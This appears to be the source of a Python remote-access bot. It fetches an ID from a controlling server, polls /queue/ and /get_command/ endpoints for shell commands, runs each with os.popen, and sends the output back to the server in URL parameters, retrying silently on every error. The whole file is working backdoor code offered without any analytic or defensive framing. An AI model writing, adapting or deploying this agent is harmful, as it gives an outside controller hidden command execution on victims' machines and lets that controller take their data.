import requests
import glob
import time
import os

host = "0.0.0.0"
session = requests.Session()

if "id" not in glob.glob("*.*"):
    while True:
        try:
            response = session.get(f"http://{host}/get_id/",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
            break
        except:
            time.sleep(30)
    with open("id","w") as file:
        file.write(response.text)

with open("id","r") as file:
    id = int(file.read())



while True:
    try:
        while True:
            try:
                response1 = session.get(f"http://{host}/blank/",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
                response2 = response1
                break
            except:
                time.sleep(5)

        while response1.text == "" and response2.text == "":
            time.sleep(5)
            response1 = session.get(f"http://{host}/queue/?id={id}&action=fetch",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
            response2 = session.get(f"http://{host}/get_command/?id={id}",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
        if response2.text == "" and response1.text != "":
            response3 = session.get(f"http://{host}/queue/?id={id}&action=pop",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
            out = "".join(list(os.popen(str(response3.text))))
            command = response3.text
        elif response2.text != "":
            out = "".join(list(os.popen(str(response2.text))))
            command = response2.text
        response_f = session.get(f"http://{host}/666",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
        while response_f.status_code != 200:
            response_f = session.get(f"http://{host}/push_command/?id={id}&data={out}&command={command}",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
            time.sleep(5)
        time.sleep(10)
    except:
        time.sleep(20)
